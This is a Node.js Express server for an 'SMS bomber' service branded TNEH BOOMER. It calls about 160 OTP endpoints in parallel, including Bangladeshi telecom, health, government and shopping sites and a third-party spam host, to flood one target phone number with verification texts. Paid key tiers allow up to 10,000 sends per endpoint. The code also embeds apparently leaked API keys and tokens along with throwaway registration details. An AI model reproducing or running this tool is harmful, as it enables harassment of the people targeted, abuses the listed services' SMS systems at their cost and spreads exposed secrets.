const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
}));
app.use(cors());
app.use(express.json());

// Developer Info
const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  website: "https://tnehboomber.onrender.com",
  api_version: "2.0.0"
};

// ========== PERSISTENT STORAGE ==========
const TMP_KEYS_FILE = '/tmp/keys.json';
const LOCAL_KEYS_FILE = path.join(__dirname, 'keys.json');
const CUSTOM_KEYS_FILE = process.env.KEYS_FILE_PATH;

function getKeysFilePath() {
  if (CUSTOM_KEYS_FILE) return CUSTOM_KEYS_FILE;
  if (process.env.RENDER) return TMP_KEYS_FILE;
  return LOCAL_KEYS_FILE;
}

const KEYS_FILE = getKeysFilePath();

function initKeysFile() {
  try {
    const dir = path.dirname(KEYS_FILE);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    if (!fs.existsSync(KEYS_FILE)) {
      fs.writeFileSync(KEYS_FILE, JSON.stringify({}, null, 2));
    }
    return true;
  } catch (error) {
    console.error('Error creating keys.json:', error.message);
    return false;
  }
}

function loadKeys() {
  try {
    initKeysFile();
    const data = fs.readFileSync(KEYS_FILE, 'utf8');
    const parsed = JSON.parse(data);
    const keysMap = new Map();
    Object.entries(parsed).forEach(([key, value]) => {
      keysMap.set(key, new Date(value));
    });
    return keysMap;
  } catch (error) {
    return new Map();
  }
}

function saveKeys(keysMap) {
  try {
    const obj = {};
    for (const [key, value] of keysMap.entries()) {
      obj[key] = value.toISOString();
    }
    fs.writeFileSync(KEYS_FILE, JSON.stringify(obj, null, 2));
    return true;
  } catch (error) {
    return false;
  }
}

let validKeys = loadKeys();

function generateApiKey() {
  const prefix = 'TNEH';
  const random = Math.random().toString(36).substring(2, 15) + 
                  Math.random().toString(36).substring(2, 8).toUpperCase();
  return `${prefix}-${random}`;
}

function isKeyValid(key) {
  if (!validKeys.has(key)) return false;
  const expiryDate = validKeys.get(key);
  return new Date() < expiryDate;
}

function cleanExpiredKeys() {
  const now = new Date();
  let changed = false;
  for (const [key, expiryDate] of validKeys.entries()) {
    if (now > expiryDate) {
      validKeys.delete(key);
      changed = true;
    }
  }
  if (changed) {
    saveKeys(validKeys);
  }
}

setInterval(cleanExpiredKeys, 60 * 60 * 1000);

// ========== PLAN CONFIGURATION ==========
const PLAN_CONFIG = {
  default: {
    maxCount: 300,
    description: "Default plan - Maximum 300 SMS per API",
    requiresKey: false
  },
  free: {
    maxCount: 50,
    description: "Free plan - Maximum 50 SMS per API",
    requiresKey: false
  },
  premium: {
    maxCount: 10000,
    description: "Premium plan - Maximum 10,000 SMS per API",
    requiresKey: true
  }
};

// ========== 160 SMS APIs ==========
const ORIGINAL_APIS = [
  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 4, name: "MedEasy Health", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 5, name: "Ultranet API", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 6, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 7, name: "Binge.buzz (GET)", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { id: 9, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
  { id: 10, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
  { id: 11, name: "Grameenphone (FWA/Bkash)", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
  { id: 12, name: "BusBD.com.bd", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
  { id: 13, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
  { id: 14, name: "OsudPotro.com", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
  { id: 15, name: "Apex4u.com", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
  { id: 16, name: "Bohubrihi.com", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
  { id: 17, name: "Fundesh.com.bd", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
  { id: 18, name: "Jatri / JSLGlobal", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
  { id: 19, name: "RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
  { id: 20, name: "RabbitHoleBD", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
  { id: 21, name: "Qcoom.com", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
  { id: 22, name: "Garibookadmin.com", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
  { id: 23, name: "Training.gov.bd", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
  { id: 24, name: "Shikho.com (Intent-1)", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
  { id: 25, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
  { id: 26, name: "Robi (DA API)", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
  { id: 27, name: "Hoichoi (Viewlift)", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
  { id: 28, name: "Addatimes.com", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
  { id: 29, name: "Regal Furniture", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
  { id: 30, name: "DeeptoPlay.com", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
  { id: 31, name: "TimezoneBD", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
  { id: 32, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
  { id: 33, name: "Chorki.com / Bioscopelive", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
  { id: 34, name: "Arogga.com", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
  { id: 35, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
  { id: 36, name: "AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
  { id: 37, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
  { id: 38, name: "Ghoori Learning", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
  { id: 39, name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} },
  { id: 40, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: {"phone": "{phone}"} },
  { id: 41, name: "BdTickets.com", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: {"phone": "+880{phone}"} },
  { id: 42, name: "Binge.buzz (POST)", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: {"mobile": "{phone}"} },
  { id: 43, name: "SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", body: {"phonenumber": "{phone}"}, isFormData: true },
  { id: 44, name: "Shikho.com (Intent-2)", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"} },
  { id: 45, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: {"method": "otp", "mobile": "{phone}"} },
  { id: 46, name: "NESCO SSL Wireless", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: {"phone_number": "{phone}"} },
  { id: 47, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
  { id: 48, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 49, name: "Bioscopelive (Alternative)", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 50, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}", isShadowX: true }
];

// LMNx9 APIs (51-160)
const LMNX9_APIS = [];
for (let i = 1; i <= 110; i++) {
  LMNX9_APIS.push({
    id: 50 + i,
    name: `LMNx9 API${i}`,
    method: "GET",
    url: `https://lmnx9-sms-spam-v11.onrender.com/api${i}?number={phone}`,
    isLMNx9: true
  });
}

const SMS_APIS = [...ORIGINAL_APIS, ...LMNX9_APIS];

// ============ OPTIMIZED FUNCTIONS ============

function replacePhoneNumber(data, phone, count = 1) {
  if (typeof data === 'string') {
    return data.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
  } else if (typeof data === 'object' && data !== null) {
    const result = {};
    for (const [key, value] of Object.entries(data)) {
      if (typeof value === 'string') {
        result[key] = value.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
      } else {
        result[key] = value;
      }
    }
    return result;
  }
  return data;
}

// Optimized: Single API call with faster timeout
async function callSingleAPI(api, phone) {
  try {
    const cleanPhone = phone.replace(/[^0-9]/g, '');
    let formattedPhone = cleanPhone;
    if (api.isShadowX || api.isLMNx9) {
      if (formattedPhone.startsWith('880')) {
        formattedPhone = formattedPhone.substring(3);
      }
    }
    
    const url = replacePhoneNumber(api.url, formattedPhone, 1);
    let config = {
      method: api.method,
      url: url,
      timeout: 8000, // Faster timeout
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      }
    };

    if (api.method === 'POST' && api.body) {
      const body = replacePhoneNumber(api.body, formattedPhone, 1);
      if (api.isFormData) {
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        config.data = new URLSearchParams(body).toString();
      } else {
        config.data = body;
      }
    }

    const response = await axios(config);
    return { success: true, api_id: api.id, api_name: api.name, status: response.status };
  } catch (error) {
    return { success: false, api_id: api.id, api_name: api.name, error: error.message };
  }
}

// Optimized: Parallel batch processing
async function sendSMSFast(apis, phone, countPerApi) {
  const results = [];
  const BATCH_SIZE = 20; // Larger batch for speed
  
  for (let i = 0; i < apis.length; i += BATCH_SIZE) {
    const batch = apis.slice(i, i + BATCH_SIZE);
    
    // For each API in batch, call it countPerApi times in parallel
    const batchPromises = batch.map(async (api) => {
      const apiResults = [];
      const promises = [];
      
      // Create countPerApi parallel requests
      for (let j = 0; j < Math.min(countPerApi, 50); j++) {
        promises.push(callSingleAPI(api, phone));
      }
      
      const responses = await Promise.all(promises);
      const successCount = responses.filter(r => r.success).length;
      const failCount = responses.filter(r => !r.success).length;
      
      return {
        api_id: api.id,
        api_name: api.name,
        method: api.method,
        total_attempts: responses.length,
        successful: successCount,
        failed: failCount,
        results: responses
      };
    });
    
    const batchResults = await Promise.all(batchPromises);
    results.push(...batchResults);
  }
  
  return results;
}

// ==================== API ENDPOINTS ====================

// Root
app.get('/', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO,
    total_apis: SMS_APIS.length,
    plans: {
      default: `/api/spam?number=017XXXXXXXX&count=300 (Max 300, No Key)`,
      free: `/api/spam?plan=free&number=017XXXXXXXX&count=50 (Max 50, No Key)`,
      premium: `/api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000 (Max 10000, Key Required)`
    },
    endpoints: {
      generate_key: "/api/expiredate=30&createkey",
      check_key: "/api/checkkey?key=YOUR_KEY",
      spam: "/api/spam?number=017XXXXXXXX&count=300",
      spam_free: "/api/spam?plan=free&number=017XXXXXXXX&count=50",
      spam_premium: "/api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=10000",
      all_apis: "/api/apis",
      health: "/api/health"
    }
  });
});

// ============ FAST SPAM ENDPOINT ============
app.get('/api/spam', async (req, res) => {
  const startTime = Date.now();
  const { plan, number, count = 1, key } = req.query;
  
  // If plan is specified
  if (plan) {
    if (!PLAN_CONFIG[plan]) {
      return res.status(400).json({
        success: false,
        error: `Invalid plan: ${plan}. Available: free, premium`,
        developer: DEVELOPER_INFO
      });
    }
    
    const planConfig = PLAN_CONFIG[plan];
    
    if (planConfig.requiresKey) {
      if (!key || !isKeyValid(key)) {
        return res.status(401).json({
          success: false,
          error: 'Valid API key required for premium plan',
          developer: DEVELOPER_INFO
        });
      }
    }
    
    if (!number) {
      return res.status(400).json({
        success: false,
        error: 'Missing number parameter',
        developer: DEVELOPER_INFO
      });
    }
    
    const cleanNumber = number.replace(/[^0-9]/g, '');
    if (!/^(01|8801)[0-9]{9}$/.test(cleanNumber)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid phone number. Use format: 017XXXXXXXX',
        developer: DEVELOPER_INFO
      });
    }
    
    let perApiCount = parseInt(count);
    if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
    if (perApiCount > planConfig.maxCount) {
      return res.status(400).json({
        success: false,
        error: `Count exceeds ${plan} plan limit (${planConfig.maxCount})`,
        developer: DEVELOPER_INFO
      });
    }
    
    // Fast processing
    const results = await sendSMSFast(SMS_APIS, cleanNumber, perApiCount);
    
    const totalSuccess = results.reduce((sum, r) => sum + r.successful, 0);
    const totalFailed = results.reduce((sum, r) => sum + r.failed, 0);
    const responseTime = Date.now() - startTime;
    
    return res.json({
      success: true,
      developer: DEVELOPER_INFO,
      plan: plan,
      target_number: cleanNumber,
      per_api_count: perApiCount,
      total_apis: SMS_APIS.length,
      total_success: totalSuccess,
      total_failed: totalFailed,
      total_sms: totalSuccess + totalFailed,
      response_time_ms: responseTime,
      results: results
    });
  }
  
  // ============ DEFAULT (No plan) ============
  if (!number) {
    return res.status(400).json({
      success: false,
      error: 'Missing number parameter',
      developer: DEVELOPER_INFO,
      usage: '/api/spam?number=017XXXXXXXX&count=300'
    });
  }
  
  const cleanNumber = number.replace(/[^0-9]/g, '');
  if (!/^(01|8801)[0-9]{9}$/.test(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: 'Invalid phone number. Use format: 017XXXXXXXX',
      developer: DEVELOPER_INFO
    });
  }
  
  let perApiCount = parseInt(count);
  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
  if (perApiCount > PLAN_CONFIG.default.maxCount) {
    return res.status(400).json({
      success: false,
      error: `Count exceeds default limit (${PLAN_CONFIG.default.maxCount})`,
      developer: DEVELOPER_INFO,
      upgrade: 'Use premium for higher limits'
    });
  }
  
  // Fast processing
  const results = await sendSMSFast(SMS_APIS, cleanNumber, perApiCount);
  
  const totalSuccess = results.reduce((sum, r) => sum + r.successful, 0);
  const totalFailed = results.reduce((sum, r) => sum + r.failed, 0);
  const responseTime = Date.now() - startTime;
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    plan: "default",
    target_number: cleanNumber,
    per_api_count: perApiCount,
    total_apis: SMS_APIS.length,
    total_success: totalSuccess,
    total_failed: totalFailed,
    total_sms: totalSuccess + totalFailed,
    response_time_ms: responseTime,
    results: results
  });
});

// Generate API Key
app.get('/api/expiredate=30&createkey', (req, res) => {
  const apiKey = generateApiKey();
  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + 30);
  
  validKeys.set(apiKey, expiryDate);
  saveKeys(validKeys);
  
  res.json({
    success: true,
    api_key: apiKey,
    expiry_date: expiryDate.toISOString(),
    valid_days: 30,
    developer: DEVELOPER_INFO,
    message: "API key generated successfully"
  });
});

// Check API Key
app.get('/api/checkkey', (req, res) => {
  const { key } = req.query;
  if (!key) {
    return res.status(400).json({
      success: false,
      error: 'Missing API key parameter',
      developer: DEVELOPER_INFO
    });
  }
  
  const isValid = isKeyValid(key);
  const expiryDate = validKeys.get(key);
  
  res.json({
    success: true,
    valid: isValid,
    api_key: key,
    expiry_date: expiryDate ? expiryDate.toISOString() : null,
    status: isValid ? 'active' : 'invalid or expired',
    developer: DEVELOPER_INFO
  });
});

// Get all APIs
app.get('/api/apis', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO,
    total_apis: SMS_APIS.length,
    apis: SMS_APIS.map(api => ({ id: api.id, name: api.name, method: api.method })),
    plans: {
      default: { max_count: PLAN_CONFIG.default.maxCount, requires_key: false },
      free: { max_count: PLAN_CONFIG.free.maxCount, requires_key: false },
      premium: { max_count: PLAN_CONFIG.premium.maxCount, requires_key: true }
    }
  });
});

// Health check
app.get('/api/health', (req, res) => {
  let validCount = 0;
  for (const [key, expiryDate] of validKeys.entries()) {
    if (new Date() < expiryDate) validCount++;
  }
  
  res.json({
    status: 'active',
    developer: DEVELOPER_INFO,
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    total_apis: SMS_APIS.length,
    total_keys: validKeys.size,
    valid_keys: validCount,
    plans: {
      default: { max_count: PLAN_CONFIG.default.maxCount, requires_key: false },
      free: { max_count: PLAN_CONFIG.free.maxCount, requires_key: false },
      premium: { max_count: PLAN_CONFIG.premium.maxCount, requires_key: true }
    },
    endpoints: {
      spam_default: "/api/spam?number=017XXXXXXXX&count=300",
      spam_free: "/api/spam?plan=free&number=017XXXXXXXX&count=50",
      spam_premium: "/api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000"
    }
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    developer: DEVELOPER_INFO
  });
});

// Error handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    developer: DEVELOPER_INFO
  });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`\n✅ TNEH BOOMER APP running on port ${PORT}`);
  console.log(`📡 Total SMS APIs: ${SMS_APIS.length}`);
  console.log(`\n🚀 FAST RESPONSE ENABLED:`);
  console.log(`   - Parallel API calls (Batch size: 20)`);
  console.log(`   - Faster timeout (8 seconds)`);
  console.log(`   - Concurrent requests per API`);
  console.log(`\n📊 Plans:`);
  console.log(`   🔓 Default: /api/spam?number=017XXXXXXXX&count=300`);
  console.log(`   🔓 Free: /api/spam?plan=free&number=017XXXXXXXX&count=50`);
  console.log(`   🔒 Premium: /api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000`);
});
